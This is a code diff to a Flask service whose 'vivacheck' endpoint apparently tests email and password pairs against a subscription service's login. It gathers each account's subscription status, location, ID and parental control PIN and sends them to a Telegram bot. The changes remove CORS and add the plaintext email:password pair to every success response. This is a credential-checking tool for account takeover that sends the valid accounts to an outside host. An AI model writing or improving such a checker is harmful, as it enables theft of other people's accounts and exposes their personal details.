@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify
-from flask_cors import CORS
 import requests
 import json
 from datetime import datetime
@@ -8,7 +7,6 @@ from fake_useragent import UserAgent
 # from telegram import Bot
 # from aiogram import Bot
 app = Flask(__name__)
-CORS(app)
 
 def send_telegram_message(message):
     try:
@@ -100,6 +98,7 @@ def vivacheck():
                   f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
                 send_telegram_message(message)
                 return jsonify({
+                    "emeylpassword": f"{email}:{password}",
                     "subscriptionStatus": sess.json().get('subscriptionStatus'),
                     "subscriptionLocation": sess.json().get('subscriptionLocation'),
                     "subscriptionId": sess.json().get('subscriptionId'),
@@ -115,6 +114,7 @@ def vivacheck():
                   f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
                 send_telegram_message(message)
                 return jsonify({
+                    "emeylpassword": f"{email}:{password}",
                     "subscriptionStatus": sess.json().get('subscription')['status'],
                     "subscriptionLocation": sess.json().get('subscription', {}).get('location') or sess.json().get('registerLocation'),
                     # "subscriptionId": sess.json().get('subscription')['id'],
@@ -131,6 +131,7 @@ def vivacheck():
                   f"Parental Control Pin: {login3_response.get('parentalControlPin')}"
             send_telegram_message(message)
             return jsonify({
+                "emeylpassword": f"{email}:{password}",
                 "subscriptionStatus": login3_response.get('subscriptionStatus'),
                 "subscriptionLocation": login3_response.get('subscriptionLocation'),
                 "subscriptionId": login3_response.get('subscriptionId'),
